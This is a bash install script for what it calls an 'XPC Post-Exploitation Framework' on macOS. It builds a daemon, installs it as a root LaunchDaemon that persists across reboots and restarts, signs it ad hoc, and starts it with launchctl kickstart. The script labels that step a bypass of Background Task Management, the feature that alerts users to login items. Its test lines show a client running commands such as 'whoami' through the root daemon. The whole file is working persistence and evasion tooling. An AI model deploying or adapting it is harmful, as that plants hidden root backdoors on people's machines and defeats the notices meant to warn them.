#!/bin/bash
#
# install.sh — XPC Post-Exploitation Framework Deployment
#
# Builds, installs, and starts the root XPC daemon with BTM bypass.
#
# Usage: sudo ./scripts/install.sh [install|uninstall|status]
#

set -e

LABEL="com.test.smdprobe.daemon"
DAEMON_BIN="/Library/PrivilegedHelperTools/${LABEL}"
DAEMON_PLIST="/Library/LaunchDaemons/${LABEL}.plist"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
BUILD_DIR="${PROJECT_DIR}/build"

R='\033[31m' G='\033[32m' C='\033[36m' Y='\033[33m' N='\033[0m'
ok()   { echo -e "${G}[+]${N} $*"; }
fail() { echo -e "${R}[-]${N} $*"; }
info() { echo -e "${C}[*]${N} $*"; }
warn() { echo -e "${Y}[!]${N} $*"; }

do_install() {
    [ "$(id -u)" -ne 0 ] && { fail "Need root: sudo $0 install"; exit 1; }

    info "Building..."
    cd "${PROJECT_DIR}" && make clean && make
    # make ran as root — restore build dir to the invoking user
    [ -n "${SUDO_USER}" ] && chown -R "${SUDO_USER}:staff" "${BUILD_DIR}" 2>/dev/null || true
    ok "Build complete"

    # Unload if running
    launchctl bootout "system/${LABEL}" 2>/dev/null || true

    # Install daemon binary
    info "Installing daemon..."
    cp "${BUILD_DIR}/daemon" "${DAEMON_BIN}"
    chmod 555 "${DAEMON_BIN}"
    chown root:wheel "${DAEMON_BIN}"
    codesign -s - --force --identifier "${LABEL}" "${DAEMON_BIN}"
    ok "Binary: ${DAEMON_BIN}"

    # Generate plist with service name as argv[1]
    info "Installing plist..."
    cat > "${DAEMON_PLIST}" << PEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>${LABEL}</string>
	<key>MachServices</key>
	<dict>
		<key>${LABEL}</key>
		<true/>
	</dict>
	<key>KeepAlive</key>
	<true/>
	<key>RunAtLoad</key>
	<true/>
	<key>ProgramArguments</key>
	<array>
		<string>${DAEMON_BIN}</string>
		<string>${LABEL}</string>
	</array>
</dict>
</plist>
PEOF
    chmod 644 "${DAEMON_PLIST}"
    chown root:wheel "${DAEMON_PLIST}"
    ok "Plist: ${DAEMON_PLIST}"

    # Load + kickstart (BTM bypass)
    info "Loading into launchd..."
    launchctl bootstrap system "${DAEMON_PLIST}"
    ok "Loaded"

    info "Kickstarting (BTM bypass)..."
    launchctl kickstart -kp "system/${LABEL}"
    ok "Daemon running as root"

    sleep 1
    do_status

    echo ""
    ok "=== Installation complete ==="
    info "Test: ${BUILD_DIR}/client ${LABEL} i"
    info "Test: ${BUILD_DIR}/client ${LABEL} e whoami"
    info "Test: ${BUILD_DIR}/client ${LABEL} k1"
}

do_uninstall() {
    [ "$(id -u)" -ne 0 ] && { fail "Need root: sudo $0 uninstall"; exit 1; }
    info "Uninstalling ${LABEL}..."
    launchctl bootout "system/${LABEL}" 2>/dev/null && ok "Unloaded" || warn "Not loaded"
    [ -f "${DAEMON_BIN}" ]   && rm -f "${DAEMON_BIN}"   && ok "Removed ${DAEMON_BIN}"
    [ -f "${DAEMON_PLIST}" ] && rm -f "${DAEMON_PLIST}" && ok "Removed ${DAEMON_PLIST}"
    ok "Uninstall complete"
}

do_status() {
    info "=== Status: ${LABEL} ==="
    [ -f "${DAEMON_BIN}" ] \
        && ok "Binary: ${DAEMON_BIN} ($(wc -c < "${DAEMON_BIN}" | tr -d ' ') bytes)" \
        || fail "Binary: not installed"
    [ -f "${DAEMON_PLIST}" ] && ok "Plist: ${DAEMON_PLIST}" || fail "Plist: not installed"

    STATE=$(launchctl print "system/${LABEL}" 2>&1 | grep "state = " | head -1 | awk '{print $3}')
    if [ -n "$STATE" ]; then
        [ "$STATE" = "running" ] && ok "State: ${STATE}" || warn "State: ${STATE}"
    else
        fail "Not in launchd"
    fi

    command -v sfltool &>/dev/null && {
        BTM=$(sfltool dumpbtm 2>/dev/null | grep -A 5 "${LABEL}" | grep "Disposition" | head -1)
        [ -n "$BTM" ] && info "BTM: $BTM"
    }
}

case "${1:-install}" in
    install)   do_install ;;
    uninstall) do_uninstall ;;
    status)    do_status ;;
    *) echo "Usage: sudo $0 [install|uninstall|status]"; exit 1 ;;
esac
